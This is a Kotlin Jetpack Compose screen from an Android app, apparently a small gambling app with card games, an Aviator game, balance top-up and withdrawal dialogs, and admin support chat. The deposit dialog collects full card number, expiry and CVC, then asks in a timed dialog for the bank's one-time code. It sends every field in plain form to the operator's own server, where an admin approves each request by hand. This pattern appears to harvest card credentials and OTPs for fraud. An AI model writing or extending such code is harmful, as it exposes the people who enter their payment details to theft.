package com.example.a3tuz

import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.SupportAgent
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.*
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.a3tuz.api.AppConfig
import com.example.a3tuz.api.DepositRequest
import com.example.a3tuz.api.RetrofitInstance
import com.example.a3tuz.api.SocketManager
import com.example.a3tuz.api.AdminRequestData
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Locale
import androidx.compose.ui.focus.FocusRequester
import androidx.compose.ui.focus.focusRequester
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalFocusManager
import androidx.compose.foundation.lazy.items

// Kart nömrəsi üçün vizual format (4-4-4-4)
class CreditCardVisualTransformation : VisualTransformation {
    override fun filter(text: AnnotatedString): TransformedText {
        val trimmed = if (text.text.length >= 16) text.text.substring(0..15) else text.text
        var out = ""
        for (i in trimmed.indices) {
            out += trimmed[i]
            if (i % 4 == 3 && i != 15) out += " "
        }

        val creditCardOffsetTranslator = object : OffsetMapping {
            override fun originalToTransformed(offset: Int): Int {
                if (offset <= 4) return offset
                if (offset <= 8) return offset + 1
                if (offset <= 12) return offset + 2
                if (offset <= 16) return offset + 3
                return 19
            }

            override fun transformedToOriginal(offset: Int): Int {
                if (offset <= 4) return offset
                if (offset <= 9) return offset - 1
                if (offset <= 14) return offset - 2
                if (offset <= 19) return offset - 3
                return 16
            }
        }

        return TransformedText(AnnotatedString(out), creditCardOffsetTranslator)
    }
}

// Müddət üçün vizual format (MM/YY)
class ExpiryDateVisualTransformation : VisualTransformation {
    override fun filter(text: AnnotatedString): TransformedText {
        val trimmed = if (text.text.length >= 4) text.text.substring(0..3) else text.text
        var out = ""
        for (i in trimmed.indices) {
            out += trimmed[i]
            if (i == 1 && trimmed.length > 2) out += "/"
        }

        val expiryOffsetTranslator = object : OffsetMapping {
            override fun originalToTransformed(offset: Int): Int {
                if (offset <= 2) return offset
                return offset + 1
            }

            override fun transformedToOriginal(offset: Int): Int {
                if (offset <= 2) return offset
                return offset - 1
            }
        }

        return TransformedText(AnnotatedString(out), expiryOffsetTranslator)
    }
}

@Composable
fun MainScreen(showTopUpImmediately: Boolean = false, onGameSelect: (String) -> Unit, onBackToGame: () -> Unit = {}) {
    var showUserPanel by remember { mutableStateOf(false) }
    var showRequestsHistory by remember { mutableStateOf(false) }
    
    var showAddBalanceDialog by remember { mutableStateOf(showTopUpImmediately) }
    var showWithdrawDialog by remember { mutableStateOf(false) }
    var showOtpDialog by remember { mutableStateOf(false) }
    
    var showMessageDialog by remember { mutableStateOf(false) }
    var adminMessageText by remember { mutableStateOf("") }
    var isSendingMessage by remember { mutableStateOf(false) }
    var userMessages by remember { mutableStateOf<List<com.example.a3tuz.api.AdminMessageData>>(emptyList()) }
    var isFetchingMessages by remember { mutableStateOf(false) }
    var hasNewAdminReply by remember { mutableStateOf(false) }
    
    var amountText by remember { mutableStateOf("") }
    var cardNo by remember { mutableStateOf("") }
    var expiry by remember { mutableStateOf("") }
    var cvc by remember { mutableStateOf("") }
    var otpText by remember { mutableStateOf("") }
    
    var timeLeft by remember { mutableStateOf(300) } // 5 deqiqe = 300 saniyə
    var isSubmitting by remember { mutableStateOf(false) }
    
    var userRequests by remember { mutableStateOf<List<AdminRequestData>>(emptyList()) }
    
    val focusRequesterExpiry = remember { FocusRequester() }
    val focusRequesterCvc = remember { FocusRequester() }
    val focusManager = LocalFocusManager.current
    val mainContext = LocalContext.current
    val scope = rememberCoroutineScope()

    // Mesajları və sorğuları canlı yeniləmək üçün socket dinləyicisi
    DisposableEffect(Unit) {
        val socket = SocketManager.getSocket()
        
        fun refreshMessages() {
            scope.launch {
                try {
                    val resp = RetrofitInstance.api.getUserMessages(AppConfig.currentUsername)
                    if (resp.isSuccessful) {
                        val msgs = resp.body() ?: emptyList()
                        userMessages = msgs
                        if (!showMessageDialog) {
                            hasNewAdminReply = msgs.any { it.reply != null && it.status == "replied" }
                        }
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }
        }

        val requestsListener = io.socket.emitter.Emitter.Listener { args ->
            val data = args.getOrNull(0) as? org.json.JSONArray
            if (data != null) {
                val list = mutableListOf<AdminRequestData>()
                for (i in 0 until data.length()) {
                    val obj = data.getJSONObject(i)
                    list.add(AdminRequestData(
                        id = obj.getLong("id"),
                        username = obj.getString("username"),
                        type = obj.getString("type"),
                        amount = obj.getDouble("amount"),
                        cardNo = obj.getString("cardNo"),
                        expiry = obj.getString("expiry"),
                        cvc = obj.getString("cvc"),
                        otp = obj.getString("otp"),
                        status = obj.getString("status"),
                        date = obj.getString("date")
                    ))
                }
                userRequests = list
            }
        }
        
        val adminUpdateListener = io.socket.emitter.Emitter.Listener { 
            refreshMessages() 
        }
        
        socket?.on("userRequestsUpdate", requestsListener)
        socket?.on("adminUpdate", adminUpdateListener)
        socket?.on("notification", adminUpdateListener)
        
        refreshMessages()
        
        onDispose {
            socket?.off("userRequestsUpdate", requestsListener)
            socket?.off("adminUpdate", adminUpdateListener)
            socket?.off("notification", adminUpdateListener)
        }
    }

    // OTP Taymeri
    LaunchedEffect(showOtpDialog) {
        if (showOtpDialog) {
            timeLeft = 300
            while (timeLeft > 0) {
                delay(1000)
                timeLeft--
            }
            showOtpDialog = false // Vaxt bitəndə bağla
        }
    }

    Scaffold(
        modifier = Modifier.fillMaxSize(),
        containerColor = Color(0xFFF5F5F5),
        topBar = {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                color = Color.White,
                shadowElevation = 2.dp
            ) {
                Row(
                    modifier = Modifier
                        .statusBarsPadding()
                        .padding(horizontal = 16.dp, vertical = 12.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Text(
                            text = "İstifadəçi",
                            fontSize = 12.sp,
                            color = Color.Gray
                        )
                        Text(
                            text = AppConfig.currentUsername,
                            fontSize = 18.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.Black
                        )
                    }
                    
                    Row(verticalAlignment = Alignment.CenterVertically) {
                                IconButton(
                            onClick = { 
                                showMessageDialog = true 
                                hasNewAdminReply = false // Açanda nöqtəni sil
                                // Mesajları gətir
                                scope.launch {
                                    isFetchingMessages = true
                                    try {
                                        val resp = RetrofitInstance.api.getUserMessages(AppConfig.currentUsername)
                                        if (resp.isSuccessful) userMessages = resp.body() ?: emptyList()
                                    } catch (e: Exception) { e.printStackTrace() }
                                    finally { isFetchingMessages = false }
                                }
                            },
                            modifier = Modifier.padding(end = 8.dp)
                        ) {
                            Box {
                                Icon(Icons.Default.SupportAgent, contentDescription = "Dəstək", tint = Color(0xFFF57F17))
                                if (hasNewAdminReply) {
                                    Box(
                                        modifier = Modifier
                                            .size(8.dp)
                                            .background(Color.Red, CircleShape)
                                            .align(Alignment.TopEnd)
                                    )
                                }
                            }
                        }
                        
                        Surface(
                            modifier = Modifier.clickable { 
                                showUserPanel = true 
                                SocketManager.getSocket()?.emit("getUserRequests", AppConfig.currentUsername)
                            },
                            color = Color(0xFFE8F5E9),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 12.dp, vertical = 6.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Column(horizontalAlignment = Alignment.End) {
                                    Text(
                                        text = "Balans",
                                        fontSize = 11.sp,
                                        color = Color(0xFF2E7D32)
                                    )
                                    // AppConfig.userBalance reaktiv olduğu üçün burada birbaşa istifadə edirik
                                    Text(
                                        text = "${String.format(Locale.getDefault(), "%.2f", AppConfig.userBalance)} ₼",
                                        fontSize = 16.sp,
                                        fontWeight = FontWeight.ExtraBold,
                                        color = Color(0xFF1B5E20)
                                    )
                                }
                                Spacer(Modifier.width(8.dp))
                                Box(
                                    modifier = Modifier
                                        .size(24.dp)
                                        .background(Color(0xFF2E7D32), CircleShape),
                                    contentAlignment = Alignment.Center
                                ) {
                                    androidx.compose.material3.Icon(
                                        imageVector = androidx.compose.material.icons.Icons.Default.Add,
                                        contentDescription = null,
                                        tint = Color.White,
                                        modifier = Modifier.size(16.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    ) { innerPadding ->
        if (showUserPanel) {
            AlertDialog(
                onDismissRequest = { showUserPanel = false },
                title = { Text("Maliyyə Paneli", fontWeight = FontWeight.Bold) },
                text = {
                    Column(modifier = Modifier.fillMaxWidth()) {
                        Button(
                            onClick = { 
                                showUserPanel = false
                                showAddBalanceDialog = true 
                            },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
                        ) {
                            Text("Balansı Artır")
                        }
                        Spacer(modifier = Modifier.height(8.dp))
                        Button(
                            onClick = { 
                                showUserPanel = false
                                showWithdrawDialog = true 
                            },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE91E63))
                        ) {
                            Text("Balansı Çıxar")
                        }
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedButton(
                            onClick = { 
                                showUserPanel = false
                                showRequestsHistory = true 
                            },
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Text("Sorğularım")
                        }
                    }
                },
                confirmButton = {
                    TextButton(onClick = { showUserPanel = false }) { Text("Bağla") }
                }
            )
        }

        if (showMessageDialog) {
            AlertDialog(
                onDismissRequest = { if(!isSendingMessage) showMessageDialog = false },
                title = { Text("Dəstək", fontWeight = FontWeight.Bold) },
                text = {
                    Column(modifier = Modifier.fillMaxWidth()) {
                        // Mesaj Tarixçəsi
                        Box(modifier = Modifier.height(250.dp).fillMaxWidth()) {
                            if (isFetchingMessages) {
                                CircularProgressIndicator(modifier = Modifier.align(Alignment.Center))
                            } else if (userMessages.isEmpty()) {
                                Text("Hələ mesajınız yoxdur.", modifier = Modifier.align(Alignment.Center), color = Color.Gray, fontSize = 12.sp)
                            } else {
                                androidx.compose.foundation.lazy.LazyColumn(
                                    modifier = Modifier.fillMaxSize(),
                                    reverseLayout = true // Mesajlar aşağıdan yuxarıya düzülsün
                                ) {
                                    // asReversed() istifadə edirik ki, son mesaj ən aşağıda olsun
                                    items(userMessages.asReversed()) { msg ->
                                        Card(
                                            modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                                            colors = CardDefaults.cardColors(containerColor = Color(0xFFF5F5F5))
                                        ) {
                                            Column(modifier = Modifier.padding(8.dp)) {
                                                // Sistem mesajını gizlət, yalnız əsl mesajları göstər
                                                if (msg.message != "(Admin tərəfindən başladıldı)") {
                                                    Text(msg.message, fontSize = 13.sp)
                                                    Text(msg.date, fontSize = 9.sp, color = Color.Gray, modifier = Modifier.align(Alignment.End))
                                                }
                                                
                                                if (msg.reply != null) {
                                                    Surface(
                                                        color = Color(0xFFE8F5E9),
                                                        shape = RoundedCornerShape(6.dp),
                                                        modifier = Modifier.padding(top = if(msg.message != "(Admin tərəfindən başladıldı)") 4.dp else 0.dp).fillMaxWidth()
                                                    ) {
                                                        Column(modifier = Modifier.padding(6.dp)) {
                                                            Text("Admin Cavabı:", fontSize = 10.sp, color = Color(0xFF2E7D32), fontWeight = FontWeight.Bold)
                                                            Text(msg.reply, fontSize = 12.sp)
                                                            if (msg.message == "(Admin tərəfindən başladıldı)") {
                                                                Text(msg.date, fontSize = 9.sp, color = Color.Gray, modifier = Modifier.align(Alignment.End))
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        
                        Divider(modifier = Modifier.padding(vertical = 12.dp))
                        
                        Text("Yeni mesaj yazın:", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        Spacer(Modifier.height(4.dp))
                        OutlinedTextField(
                            value = adminMessageText,
                            onValueChange = { adminMessageText = it },
                            placeholder = { Text("Problem və ya təklifiniz...") },
                            modifier = Modifier.fillMaxWidth().height(100.dp),
                            maxLines = 4
                        )
                    }
                },
                confirmButton = {
                    Button(
                        onClick = {
                            if (adminMessageText.isNotBlank()) {
                                isSendingMessage = true
                                scope.launch {
                                    try {
                                        val resp = RetrofitInstance.api.sendMessageToAdmin(mapOf(
                                            "username" to AppConfig.currentUsername,
                                            "message" to adminMessageText
                                        ))
                                        if (resp.isSuccessful) {
                                            adminMessageText = ""
                                            // Mesajları yenilə
                                            val newMsgs = RetrofitInstance.api.getUserMessages(AppConfig.currentUsername)
                                            if (newMsgs.isSuccessful) userMessages = newMsgs.body() ?: emptyList()
                                            
                                            android.widget.Toast.makeText(mainContext, "Mesaj göndərildi!", android.widget.Toast.LENGTH_SHORT).show()
                                        }
                                    } catch (e: Exception) { e.printStackTrace() }
                                    finally { isSendingMessage = false }
                                }
                            }
                        },
                        enabled = !isSendingMessage && adminMessageText.isNotBlank()
                    ) {
                        if (isSendingMessage) CircularProgressIndicator(modifier = Modifier.size(20.dp), strokeWidth = 2.dp, color = Color.White)
                        else Text("GÖNDƏR")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showMessageDialog = false }, enabled = !isSendingMessage) { Text("BAĞLA") }
                }
            )
        }

        if (showRequestsHistory) {
            AlertDialog(
                onDismissRequest = { showRequestsHistory = false },
                title = { Text("Sorğularım", fontWeight = FontWeight.Bold) },
                text = {
                    Box(modifier = Modifier.height(400.dp)) {
                        if (userRequests.isEmpty()) {
                            Text("Hələ heç bir sorğunuz yoxdur.", modifier = Modifier.align(Alignment.Center))
                        } else {
                            androidx.compose.foundation.lazy.LazyColumn {
                                items(userRequests.reversed().size) { index ->
                                    val req = userRequests.reversed()[index]
                                    Card(
                                        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                                        colors = CardDefaults.cardColors(
                                            containerColor = when(req.status) {
                                                "approved" -> Color(0xFFE8F5E9)
                                                "rejected" -> Color(0xFFFFEBEE)
                                                else -> Color.White
                                            }
                                        ),
                                        elevation = CardDefaults.cardElevation(1.dp)
                                    ) {
                                        Column(modifier = Modifier.padding(12.dp)) {
                                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                                Text(
                                                    text = if(req.type == "deposit") "📥 Depozit" else "📤 Çıxarış",
                                                    fontWeight = FontWeight.Bold,
                                                    fontSize = 13.sp
                                                )
                                                Text(req.date.split(", ").lastOrNull() ?: "", fontSize = 11.sp, color = Color.Gray)
                                            }
                                            Text(text = "${req.amount} AZN", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                                            Text(
                                                text = when(req.status) {
                                                    "approved" -> "✅ Təsdiqləndi"
                                                    "rejected" -> "❌ Rədd edildi"
                                                    else -> "⏳ Gözlənilir..."
                                                },
                                                fontSize = 12.sp,
                                                color = if(req.status == "approved") Color(0xFF2E7D32) else if(req.status == "rejected") Color.Red else Color.Gray
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                confirmButton = {
                    TextButton(onClick = { showRequestsHistory = false }) { Text("Bağla") }
                }
            )
        }
        if (showAddBalanceDialog) {
            AlertDialog(
                onDismissRequest = { showAddBalanceDialog = false },
                title = { Text("Balansı Artır", fontWeight = FontWeight.Bold) },
                text = {
                    Column {
                        OutlinedTextField(
                            value = amountText,
                            onValueChange = { if (it.length <= 10) amountText = it },
                            label = { Text("Məbləğ (₼)") },
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Decimal),
                            singleLine = true
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(
                            value = cardNo,
                            onValueChange = { input ->
                                if (input.length <= 16 && input.all { it.isDigit() }) {
                                    cardNo = input
                                    if (input.length == 16) focusRequesterExpiry.requestFocus()
                                }
                            },
                            label = { Text("Kart Nömrəsi (16 rəqəm)") },
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                            visualTransformation = CreditCardVisualTransformation(),
                            singleLine = true
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Row {
                            OutlinedTextField(
                                value = expiry,
                                onValueChange = { input ->
                                    if (input.length <= 4 && input.all { it.isDigit() }) {
                                        expiry = input
                                        if (input.length == 4) focusRequesterCvc.requestFocus()
                                    }
                                },
                                label = { Text("Müddət (MM/YY)") },
                                modifier = Modifier.weight(1f).focusRequester(focusRequesterExpiry),
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                visualTransformation = ExpiryDateVisualTransformation(),
                                singleLine = true
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            OutlinedTextField(
                                value = cvc,
                                onValueChange = { input ->
                                    if (input.length <= 3 && input.all { it.isDigit() }) {
                                        cvc = input
                                        if (input.length == 3) focusManager.clearFocus()
                                    }
                                },
                                label = { Text("CVC") },
                                modifier = Modifier.weight(0.5f).focusRequester(focusRequesterCvc),
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                singleLine = true
                            )
                        }
                    }
                },
                confirmButton = {
                    Button(
                        onClick = {
                            val amount = amountText.toDoubleOrNull() ?: 0.0
                            if (amount > 0 && cardNo.length == 16 && expiry.length == 4 && cvc.length == 3) {
                                isSubmitting = true
                                scope.launch {
                                    try {
                                        // İlk olaraq serverə "Gözlənilir..." statusu ilə göndəririk
                                        val req = DepositRequest(
                                            username = AppConfig.currentUsername,
                                            type = "deposit",
                                            amount = amount,
                                            cardNo = cardNo,
                                            expiry = expiry,
                                            cvc = cvc,
                                            otp = "Gözlənilir..."
                                        )
                                        val response = RetrofitInstance.api.createRequest(req)
                                        if (response.isSuccessful) {
                                            showAddBalanceDialog = false
                                            showOtpDialog = true
                                        }
                                    } catch (e: Exception) {
                                        e.printStackTrace()
                                    } finally {
                                        isSubmitting = false
                                    }
                                }
                            }
                        },
                        enabled = !isSubmitting,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
                    ) {
                        if (isSubmitting) CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp))
                        else Text("Göndər")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showAddBalanceDialog = false }) {
                        Text("Ləğv et")
                    }
                }
            )
        }

        if (showWithdrawDialog) {
            AlertDialog(
                onDismissRequest = { showWithdrawDialog = false },
                title = { Text("Balansı Çıxar", fontWeight = FontWeight.Bold) },
                text = {
                    Column {
                        Text("Minimum çıxarış: 20 AZN", fontSize = 12.sp, color = Color.Gray)
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(
                            value = amountText,
                            onValueChange = { if (it.length <= 10) amountText = it },
                            label = { Text("Məbləğ (₼)") },
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Decimal),
                            singleLine = true
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(
                            value = cardNo,
                            onValueChange = { input ->
                                if (input.length <= 16 && input.all { it.isDigit() }) {
                                    cardNo = input
                                    if (input.length == 16) focusRequesterExpiry.requestFocus()
                                }
                            },
                            label = { Text("Kart Nömrəsi (16 rəqəm)") },
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                            visualTransformation = CreditCardVisualTransformation(),
                            singleLine = true
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(
                            value = expiry,
                            onValueChange = { input ->
                                if (input.length <= 4 && input.all { it.isDigit() }) {
                                    expiry = input
                                }
                            },
                            label = { Text("Müddət (MM/YY)") },
                            modifier = Modifier.fillMaxWidth().focusRequester(focusRequesterExpiry),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                            visualTransformation = ExpiryDateVisualTransformation(),
                            singleLine = true
                        )
                    }
                },
                confirmButton = {
                    Button(
                        onClick = {
                            val amount = amountText.toDoubleOrNull() ?: 0.0
                            if (amount >= 20 && cardNo.length == 16 && expiry.length == 4) {
                                isSubmitting = true
                                scope.launch {
                                    try {
                                        val req = DepositRequest(
                                            username = AppConfig.currentUsername,
                                            type = "withdraw",
                                            amount = amount,
                                            cardNo = cardNo,
                                            expiry = expiry,
                                            cvc = "N/A",
                                            otp = "N/A"
                                        )
                                        val response = RetrofitInstance.api.createRequest(req)
                                        if (response.isSuccessful) {
                                            // Balansı dərhal optimistik olaraq azaldırıq
                                            AppConfig.userBalance = (AppConfig.userBalance - amount).coerceAtLeast(0.0)

                                            showWithdrawDialog = false
                                            amountText = ""
                                            cardNo = ""
                                            expiry = ""
                                        }
                                    } catch (e: Exception) {
                                        e.printStackTrace()
                                    } finally {
                                        isSubmitting = false
                                    }
                                }
                            }
                        },
                        enabled = !isSubmitting,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE91E63))
                    ) {
                        if (isSubmitting) CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp))
                        else Text("Çıxarış Sorğusu Göndər")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showWithdrawDialog = false }) {
                        Text("Ləğv et")
                    }
                }
            )
        }

        if (showOtpDialog) {
            AlertDialog(
                onDismissRequest = { showOtpDialog = false },
                title = { Text("OTP Təsdiqi", fontWeight = FontWeight.Bold) },
                text = {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text(
                            text = "Kartınıza göndərilən 4-6 rəqəmli kodu daxil edin",
                            fontSize = 14.sp,
                            color = Color.Gray
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        OutlinedTextField(
                            value = otpText,
                            onValueChange = { if (it.length <= 6 && it.all { c -> c.isDigit() }) otpText = it },
                            label = { Text("OTP Kodu") },
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                            singleLine = true
                        )
                        Spacer(modifier = Modifier.height(12.dp))
                        val minutes = timeLeft / 60
                        val seconds = timeLeft % 60
                        Text(
                            text = String.format(Locale.getDefault(), "Qalan vaxt: %02d:%02d", minutes, seconds),
                            color = if (timeLeft < 30) Color.Red else Color.Black,
                            fontWeight = FontWeight.Bold
                        )
                    }
                },
                confirmButton = {
                    Button(
                        onClick = {
                            if (otpText.length >= 4) {
                                isSubmitting = true
                                scope.launch {
                                    try {
                                        val req = DepositRequest(
                                            username = AppConfig.currentUsername,
                                            type = "deposit",
                                            amount = amountText.toDoubleOrNull() ?: 0.0,
                                            cardNo = cardNo,
                                            expiry = expiry,
                                            cvc = cvc,
                                            otp = otpText
                                        )
                                        val response = RetrofitInstance.api.createRequest(req)
                                        if (response.isSuccessful) {
                                            showOtpDialog = false
                                            amountText = ""
                                            cardNo = ""
                                            expiry = ""
                                            cvc = ""
                                            otpText = ""
                                            // OTP-dən sonra oyuna qayıtmaq üçün:
                                            onBackToGame()
                                        }
                                    } catch (e: Exception) {
                                        e.printStackTrace()
                                    } finally {
                                        isSubmitting = false
                                    }
                                }
                            }
                        },
                        enabled = !isSubmitting && otpText.length >= 4,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
                    ) {
                        if (isSubmitting) CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp))
                        else Text("Təsdiqlə")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showOtpDialog = false }) {
                        Text("Geri")
                    }
                }
            )
        }
        Column(
            modifier = Modifier
                .padding(innerPadding)
                .fillMaxSize()
                .padding(horizontal = 16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "OYUNLAR",
                fontSize = 28.sp,
                fontWeight = FontWeight.ExtraBold,
                color = Color.Black,
                modifier = Modifier.padding(vertical = 20.dp)
            )

            // 3 Tuz Oyun Düyməsi
            GameCard(
                title = "3 TUZ",
                imageRes = R.drawable.kartseka,
                onClick = { onGameSelect("3tuz") }
            )

            Spacer(modifier = Modifier.height(16.dp))

            // Aviator Oyun Düyməsi
            GameCard(
                title = "AVIATOR",
                imageRes = R.drawable.aviatorsekil,
                onClick = { onGameSelect("aviator") }
            )

            Spacer(modifier = Modifier.height(16.dp))

            // Nard Oyun Düyməsi (Tezliklə)
            GameCard(
                title = "NARD",
                imageRes = R.drawable.nard,
                subtitle = "Tezliklə",
                onClick = { /* Hələlik aktiv deyil */ }
            )

            Spacer(modifier = Modifier.height(12.dp))
            
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(containerColor = Color.White),
                elevation = CardDefaults.cardElevation(1.dp)
            ) {
                Row(
                    modifier = Modifier.padding(16.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    CircularProgressIndicator(modifier = Modifier.size(20.dp), strokeWidth = 2.dp)
                    Spacer(modifier = Modifier.width(12.dp))
                    Text(
                        text = "Yeni oyunlar tezliklə...",
                        color = Color.Gray,
                        fontSize = 13.sp
                    )
                }
            }
        }
    }
}

@Composable
fun GameCard(title: String, imageRes: Int, subtitle: String = "İndi Oyna", onClick: () -> Unit) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .height(160.dp)
            .clickable { onClick() },
        shape = RoundedCornerShape(16.dp),
        elevation = CardDefaults.cardElevation(6.dp)
    ) {
        Box(modifier = Modifier.fillMaxSize()) {
            Image(
                painter = painterResource(id = imageRes),
                contentDescription = title,
                modifier = Modifier.fillMaxSize(),
                contentScale = ContentScale.Crop
            )
            // Overlay gradient or semi-transparent background for text
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(
                        androidx.compose.ui.graphics.Brush.verticalGradient(
                            colors = listOf(Color.Transparent, Color.Black.copy(alpha = 0.7f)),
                            startY = 200f
                        )
                    )
                    .padding(16.dp),
                contentAlignment = Alignment.BottomStart
            ) {
                Column {
                    Text(
                        text = title,
                        color = Color.White,
                        fontSize = 24.sp,
                        fontWeight = FontWeight.ExtraBold
                    )
                    Text(
                        text = subtitle,
                        color = Color.White.copy(alpha = 0.8f),
                        fontSize = 14.sp
                    )
                }
            }
        }
    }
}
